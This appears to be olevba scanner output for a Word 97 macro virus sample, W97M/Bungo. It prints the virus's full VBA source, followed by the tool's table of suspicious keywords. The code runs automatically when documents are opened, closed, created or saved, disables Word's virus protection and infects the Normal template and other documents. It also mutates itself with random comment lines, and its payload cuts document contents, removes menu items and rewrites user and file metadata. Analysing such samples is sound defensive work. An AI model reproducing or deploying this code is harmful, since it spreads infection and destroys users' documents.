olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mck.f-f9d6eb6c0bae407878dbe47b24fb416195fc2680
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mck.f-f9d6eb6c0bae407878dbe47b24fb416195fc2680 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bungo.bas 
in file: Virus.MSWord.Mck.f-f9d6eb6c0bae407878dbe47b24fb416195fc2680 - OLE stream: 'Macros/VBA/Bungo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Virus Name: W97M/Bungo
'Author Name: Lucky Warrior
'Copyright (c) 1999 Bgy. Tiguib, O.E.S.
'All rights reserved.

'I dedicate this virus to my roommates, namely:
'Tom, Deo, Allan, ArnoldBig, ArnoldSmall, Mike & Ruel
Rem MrDnKgKoGiSxNfGsCeCmOlDvVpNlJeSfSyLyByBfCwFrGwUnAsMpCjFiIkLeFtFoUmOlMm
Rem DwRnGgCvNiFnRkOpOxJqGyGlFhInHzNkLhCqAhEv
'
'Thanks Guys!! for everything...
'
'-Lucky Warrior 10 November 1999
'END
Rem BiOpPuMoRlNiBiHvBuVjEhOlBkThFwJmEvFnCfQyPpKvMzMzEwAyCnShDnOwGpIiGh


Sub AutoOpen()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Rem FuPkMsHvUyFoFqFnCyEqPxKoUsOmRsPnBtUkEmVzHxBwUrHuBuDeRlHuQhDiVpHvGqFgJrHg
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
End Sub

Sub AutoNew()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Rem VtBtAzUeFpAqCkEoCvShRuOlUlFh
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
Rem DeCpEhVxTzOqQvAkHjUmQsBhFvLiEqQtBnCwArBrHfEg
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
Rem SoEw
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Rem OkLrHoTrIiFyFkJxSeLxCrPiSsTuJfDnKwSlVtIsJkBmMlItQlEgJiKq
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
End Sub

Sub AutoClose()
On Error Resume Next
Rem KkJtAo
Rem RnJlUvIpViMwJwPqRyHnOfMfJyFfOg
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
Rem LsDwFvIfJnAzKqHrJmIwRj
Rem HiTsCgBp
Rem RfGtBkHoNiEiMjDiGoBrLwQfMoHoEpAeJvFlMnSmQrNzLyVwPxDfNjGpHkBsLt
GlobInfect = False
Rem ApSfQiKmJfRiMlIlHkImUgFeTgVhRvEjGwCuItUrMwEtUzAqQvRlVuQiLkHnAe
Set GlobalDoc = NormalTemplate
Rem IqExGnHnQvPeVuSgIgMyJtOgOoGxTiGrOjNlEoNuEt
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
Rem CgQiGrKvGeDwBpOhMtBuSuHr
End If
Rem UoSsKsJmThQoQlQhFzGqByVxDfCqUoBwNyLqVmMjAgLnIuGfLsRmKxQiOrSsBwOkQnNrDz
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
Rem IrDsDkNzDgRnQfMkSxTqAlSgBmFyGjMqSzOkIxFpTsGvCmUuJiHnBtAvIfJqQfLjBrBm
End Sub
Rem JlIlIh

Sub AutoExec()
Rem DqTiHoNjNfCrHf
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Rem UmJuEo
Rem AnBoKrLmDfJqGzNmRjEgFmVhRfDeOjCvBnOxUnHxSvDtGgJeHiRzDwSiFkNtMpKqEmHmSnVqGlPyAh
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Rem MfMnGlUsPqRsFpUuNvIxMzFlRuVkItKtEvDmOwKwQjFm
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Rem HzUlMtIsIsUwChOlUgMhLlLoKqBiAnCyBsMgLtUpPtTvEiEpRrTlTwMkPzAqNkIqHvSsClKg
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
End Sub

Sub FileSaveAs()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Rem AqCsDjIwDnOsPkBiDfTtIoPyPxLmMrHzPh
Rem CxJnLoSwQgIpBsJlUlNkDrTfKpLoFlNrOfNxMwHq
Rem OlJhTmRtAeNwOqHxQiPyDgKlToPiBoEsSt
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
Rem AtEwMyDfKhGvRoPeRfImFjQyLnRkHeDeMtNfFxQeVoVuJvOeGwPhEwVtCzOtUgDyJpMqVvKi
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
Rem AjDvKtVjJzCmGqIqVy
GlobInfect = True
End If
Rem OyUz
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Rem UjLwKeEfLlDhVyUoDwQfJxTfNpIhUnDoEzEpFoEsIzDmMfKoEgGqSsTfPhKeJtFpLpPkKgUkLfOe
Rem PhBxQlPyIrQsKpRkCkEkUxLwRv
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Rem RpEhAfPwRtNrHnLyKjIwIhSePoVxQoCfVfAeQyDzLrOiUpOjFfCuKmLkTgFrRk
Call GoToHell
End Sub

Sub FileSave()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
Rem JiHiQnVtHiLpLxDiVeVvIyHmAgVgViAlHuKeMuRoKh
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Rem ElJzDlDjBjAtJjQsAuRnKlJuUuDfHmGiHmUnCfAoUmQyIqGhEpLwLuHrRiAeLxOpAeHiGhChJf
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
ActiveDocument.Save
End Sub

Sub GoToHell()
On Error Resume Next
Randomize
ActiveLines = Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule.CountOfLines
If ActiveLines > 300 Then
Rem EpTxHiFmLtNwHzEvBoRoEeAySkHfIfJjQnRsJoStEtPqPrBiMrGtOrSjNeSlMrBjDvBpSl
With Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule
For TheLine = 1 To .CountOfLines
If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
Next TheLine
End With
Else
Rem CtLgBtCnTqHyUe
With Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule
Rem QmUqBrSwRzSfIkKwJtLmOuDiFmGfEk
PolySize = Int(Rnd * 10)
Rem GkEgPqNyEwBwTxBoQwNoEtOwJgMtFkKh
For PolyMorphic = 1 To PolySize
PolyString = ""
PolyLines = .CountOfLines
RndLine = Int(Rnd * PolyLines) + 1
StringSize = Int(Rnd * 39) + 1
For SomeString = 1 To StringSize
PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
Next SomeString
.InsertLines RndLine, "Rem " & PolyString
Rem LsJlVkMhVrKqKtTsNpPiMyBlKz
Next PolyMorphic
End With
Rem DxDsGfKoPgBoKpShSqSsCoFoNtLxToQfJoGhDgPsPqShKrHkHgAvDmDf
End If
End Sub

Sub Payload()
  On Error Resume Next
    If Day(Now) = Day(Now) And Minute(Now) <= 30 Then
    Selection.Wholestory
    Selection.Cut
    End If
  ActiveDocument.SaveAs ActiveDocument.FullName
  CommandBars("tools").Controls("Macro").Delete
  CommandBars("tools").Controls("Templates and add-ins...").Delete
  Application.Username = "Lucky Warrior"
  Application.UserInitials = "LW"
  Application.UserAddress = "Bgy. Tiguib, O.E.S."
  With Dialogs(wdDialogFileSummaryInfo)
  .Author = "Lucky Warrior"
  .Keywords = "W97M/Bungo"
  .Comments = "More to come..."
  .Execute
  End With
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

